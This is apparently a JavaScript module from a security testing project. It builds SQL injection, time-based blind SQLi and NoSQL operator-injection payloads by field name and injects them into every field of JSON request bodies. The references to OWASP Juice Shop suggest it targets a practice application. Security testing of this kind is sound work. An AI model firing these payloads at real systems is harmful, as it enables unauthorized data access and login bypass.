"use strict";
/**
 * semantic-fuzzer — Qantum Module
 * @module semantic-fuzzer
 * @path src/security/semantic-fuzzer.ts
 * @auto-documented BrutalDocEngine v2.1
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.semanticFuzzer = exports.SemanticFuzzer = void 0;
/**
 * AI-driven payload generator for SQLi/NoSQLi/BlindSQLi
 */
class SemanticFuzzer {
    // Complexity: O(1)
    generateContextualPayloads(fieldName, context) {
        // Simulate AI logic: generate payloads based on field semantics
        const lower = fieldName.toLowerCase();
        const sqli = [];
        const nosqli = [];
        // Email field
        if (lower.includes('email')) {
            sqli.push(`admin@juice-sh.op'--`, `test@example.com' OR 1=1--`, `user@domain.com' OR 'x'='x`, `attacker@evil.com' UNION SELECT * FROM Users--`, `victim@site.com' AND SLEEP(5)--`);
            nosqli.push('{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}', '{"email": {"$ne": ""}}');
        }
        else if (lower.includes('id') || lower.includes('user')) {
            sqli.push(`1 OR 1=1`, `1 UNION SELECT * FROM Users--`, `1 AND SLEEP(5)--`, `0 OR 1=1`, `1; WAITFOR DELAY '0:0:5'--`);
            nosqli.push('{"$ne": 1}', '{"$gt": 0}', '{"$regex": ".*"}', '{"$where": "1==1"}', '{"id": {"$ne": 1}}');
        }
        else if (lower.includes('basket')) {
            sqli.push(`1 OR SLEEP(5)--`, `1 UNION SELECT * FROM Baskets--`, `1; WAITFOR DELAY '0:0:5'--`, `0 OR 1=1`, `1 AND 1=1`);
            nosqli.push('{"$ne": 1}', '{"$gt": 0}', '{"$regex": ".*"}', '{"$where": "1==1"}', '{"basket": {"$ne": 1}}');
        }
        else {
            // Generic
            sqli.push(`test' OR 1=1--`, `test' UNION SELECT * FROM Users--`, `test' AND SLEEP(5)--`, `test; WAITFOR DELAY '0:0:5'--`, `test' OR 'x'='x`);
            nosqli.push('{"$ne": "test"}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}', '{"field": {"$ne": "test"}}');
        }
        return [...sqli, ...nosqli];
    }
    // Complexity: O(N*M) — nested iteration
    injectPayloadsIntoJsonBody(body, context) {
        // Recursively inject payloads into every string/number field
        const results = [];
        const keys = Object.keys(body);
        for (const key of keys) {
            const payloads = this.generateContextualPayloads(key, context);
            for (const payload of payloads) {
                const clone = JSON.parse(JSON.stringify(body));
                clone[key] = payload;
                results.push(clone);
            }
            // If value is object, recurse
            if (typeof body[key] === 'object' && body[key] !== null) {
                const nested = this.injectPayloadsIntoJsonBody(body[key], context);
                for (const n of nested) {
                    const clone = JSON.parse(JSON.stringify(body));
                    clone[key] = n;
                    results.push(clone);
                }
            }
        }
        return results;
    }
    // Complexity: O(1)
    generateBlindSQLiPayloads(fieldName) {
        const lower = fieldName.toLowerCase();
        return [
            `1 AND SLEEP(5)--`,
            `1; WAITFOR DELAY '0:0:5'--`,
            `test' AND SLEEP(5)--`,
            `test; WAITFOR DELAY '0:0:5'--`,
            `admin@juice-sh.op' AND SLEEP(5)--`
        ];
    }
}
exports.SemanticFuzzer = SemanticFuzzer;
exports.semanticFuzzer = new SemanticFuzzer();
